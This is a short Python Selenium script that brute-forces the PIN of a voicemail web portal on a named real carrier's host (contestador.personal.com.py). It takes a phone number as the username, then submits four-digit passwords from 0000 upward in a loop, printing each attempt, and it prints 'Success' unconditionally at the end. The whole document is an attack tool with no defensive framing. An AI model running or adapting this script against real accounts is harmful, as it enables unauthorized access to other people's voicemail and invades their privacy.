from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium. webdriver. common. keys import Keys
from selenium.webdriver.common.by import By
import time

browser=webdriver.Chrome()
browser.get("http://contestador.personal.com.py:8080/WebUser/bin/wicket/page?3")

name = input("Escribe numero de telefono: ")
element=browser.find_element(By.ID,"username")
element.send_keys(name)
element.submit()
time.sleep(1)

i = 0
while i < 1000:
        
    element=browser.find_element(By.ID,"password")

    newi = "{:04d}".format(i)
    password = '' + str(newi)
    element.send_keys(password)
    print(password)
    element.submit()
    time.sleep(2)
    print(browser.current_url)
    browser.get(browser.current_url)
    time.sleep(1)
    i += 1

print("Success")
